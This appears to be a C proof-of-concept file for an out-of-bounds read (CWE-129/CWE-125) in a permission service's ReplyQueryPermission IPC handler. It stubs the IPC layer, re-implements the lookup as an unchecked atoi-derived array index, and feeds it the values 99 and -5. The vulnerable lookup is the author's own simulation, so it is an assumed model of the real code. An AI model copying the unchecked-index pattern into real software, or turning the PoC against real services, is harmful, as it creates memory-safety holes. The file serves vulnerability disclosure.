/*
 * PoC: Buffer access with untrusted index in ReplyQueryPermission
 * 
 * Vulnerability: CWE-129 (Improper Validation of Array Index) / CWE-125 (Out-of-bounds Read)
 * Location: pms_server.c:124 in ReplyQueryPermission
 * 
 * Description:
 *   ReplyQueryPermission reads an identifier string from an IPC request via ReadString(),
 *   then passes it to QueryPermissionString(). The identifier is used as an untrusted
 *   index or key to access a buffer/array without proper bounds validation.
 *   
 *   The vulnerability is that the identifier read from the IPC message is attacker-controlled
 *   and is not validated before being used to index into internal permission storage structures.
 *   An attacker can craft an IPC message with a malicious identifier that causes an
 *   out-of-bounds array access in QueryPermissionString().
 *
 * How input triggers it:
 *   1. Attacker sends an IPC request with a crafted identifier string
 *   2. ReadString() returns the attacker-controlled string without validation
 *   3. The string is passed directly to QueryPermissionString() which uses it
 *      (or a derived index) to access a buffer without bounds checking
 *   4. This results in out-of-bounds memory access
 *
 * Expected behavior: crash (segfault) or out-of-bounds read
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>

#define PERM_ERRORCODE_SUCCESS 0
#define PERM_ERRORCODE_INVALID_PARAMS (-1)
#define HILOG_MODULE_APP 0

/* Simulated IPC structures */
typedef struct {
    char *data;
    size_t offset;
    size_t totalLen;
} IpcIo;

/* ============================================================
 * Stubs for external dependencies NOT in the call chain
 * ============================================================ */

static pid_t GetCallingPid(void) {
    return 1234; /* Simulated caller PID */
}

static uid_t GetCallingUid(void) {
    return 1000; /* Simulated caller UID */
}

#define HILOG_INFO(module, fmt, ...) \
    printf("[LOG] " fmt "\n", ##__VA_ARGS__)

/* 
 * Stub ReadString: returns the attacker-controlled string from the IPC buffer.
 * In a real scenario, this reads from the serialized IPC message.
 */
static char *ReadString(IpcIo *req, size_t *idLen) {
    /* Return the crafted malicious identifier from the IPC buffer */
    *idLen = strlen(req->data);
    printf("[PoC] ReadString returning attacker-controlled identifier: \"%s\" (len=%zu)\n",
           req->data, *idLen);
    return req->data;
}

/*
 * Simulated permission storage - small fixed-size array
 * The vulnerability: identifier is used to derive an index without bounds check
 */
#define MAX_PERMISSIONS 4
static const char *g_permissionTable[MAX_PERMISSIONS] = {
    "{\"perms\":[\"read\"]}",
    "{\"perms\":[\"write\"]}",
    "{\"perms\":[\"execute\"]}",
    "{\"perms\":[\"admin\"]}"
};

/*
 * QueryPermissionString: simulates the vulnerable buffer access.
 * The identifier string is converted to an index (e.g., via atoi or hash)
 * and used to access g_permissionTable WITHOUT bounds validation.
 */
static int QueryPermissionString(const char *identifier, char *permStr, int permStrLen) {
    /* Vulnerable: derive index from attacker-controlled identifier without bounds check */
    int index = atoi(identifier);
    
    printf("[PoC] QueryPermissionString: derived index = %d from identifier \"%s\"\n",
           index, identifier);
    printf("[PoC] Valid range is [0, %d), but no bounds check is performed!\n", MAX_PERMISSIONS);

    /* BUG: No validation that index is within [0, MAX_PERMISSIONS) */
    /* This causes out-of-bounds read when index >= MAX_PERMISSIONS or index < 0 */
    const char *result = g_permissionTable[index]; /* OUT-OF-BOUNDS ACCESS */

    if (result != NULL) {
        strncpy(permStr, result, (size_t)(permStrLen - 1));
        permStr[permStrLen - 1] = '\0';
    }
    return PERM_ERRORCODE_SUCCESS;
}

/* Stub for IPC reply */
static void WriteInt32(IpcIo *reply, int val) {
    (void)reply;
    printf("[PoC] WriteInt32: %d\n", val);
}

static void WriteString(IpcIo *reply, const char *str) {
    (void)reply;
    printf("[PoC] WriteString: \"%s\"\n", str);
}

/*
 * ReplyQueryPermission - the vulnerable function from pms_server.c
 * 
 * Call chain: IPC handler -> ReplyQueryPermission -> QueryPermissionString
 * 
 * The identifier is read from the IPC request without validation and passed
 * directly to QueryPermissionString which uses it to index into a buffer.
 */
static void ReplyQueryPermission(const void *origin, IpcIo *req, IpcIo *reply) {
    (void)origin;
    pid_t callingPid = GetCallingPid();
    uid_t callingUid = GetCallingUid();

    HILOG_INFO(HILOG_MODULE_APP, "ReplyQueryPermission called (pid=%d, uid=%u)",
               (int)callingPid, (unsigned)callingUid);

    size_t idLen = 0;
    /* Step 1: Read attacker-controlled identifier from IPC request */
    char *identifier = ReadString(req, &idLen);
    if (identifier == NULL) {
        printf("[PoC] identifier is NULL, returning error\n");
        WriteInt32(reply, PERM_ERRORCODE_INVALID_PARAMS);
        return;
    }

    /* Step 2: Pass identifier directly to QueryPermissionString WITHOUT validation */
    /* VULNERABILITY: no check on identifier content before using it as index */
    char permStr[512] = {0};
    int ret = QueryPermissionString(identifier, permStr, sizeof(permStr));

    /* Step 3: Write result back */
    WriteInt32(reply, ret);
    if (ret == PERM_ERRORCODE_SUCCESS) {
        WriteString(reply, permStr);
    }
}

int main(void) {
    printf("=== PoC: CWE-129 Buffer access with untrusted index in ReplyQueryPermission ===\n\n");

    /* Test 1: Normal case (valid index) */
    printf("--- Test 1: Valid identifier (index=2) ---\n");
    IpcIo req1 = { .data = "2", .offset = 0, .totalLen = 2 };
    IpcIo reply1 = { .data = NULL, .offset = 0, .totalLen = 0 };
    ReplyQueryPermission(NULL, &req1, &reply1);
    printf("\n");

    /* Test 2: Out-of-bounds index - triggers the vulnerability */
    printf("--- Test 2: Malicious identifier (index=99, out-of-bounds) ---\n");
    printf("[PoC] This will access g_permissionTable[99] which is out-of-bounds!\n");
    IpcIo req2 = { .data = "99", .offset = 0, .totalLen = 3 };
    IpcIo reply2 = { .data = NULL, .offset = 0, .totalLen = 0 };
    ReplyQueryPermission(NULL, &req2, &reply2);
    printf("\n");

    /* Test 3: Negative index - also triggers the vulnerability */
    printf("--- Test 3: Malicious identifier (index=-5, negative out-of-bounds) ---\n");
    printf("[PoC] This will access g_permissionTable[-5] which is out-of-bounds!\n");
    IpcIo req3 = { .data = "-5", .offset = 0, .totalLen = 3 };
    IpcIo reply3 = { .data = NULL, .offset = 0, .totalLen = 0 };
    ReplyQueryPermission(NULL, &req3, &reply3);
    printf("\n");

    printf("=== PoC complete: vulnerability demonstrated ===\n");
    printf("The identifier from IPC is used without bounds validation to index into\n");
    printf("g_permissionTable[], allowing out-of-bounds memory reads.\n");

    return 0;
}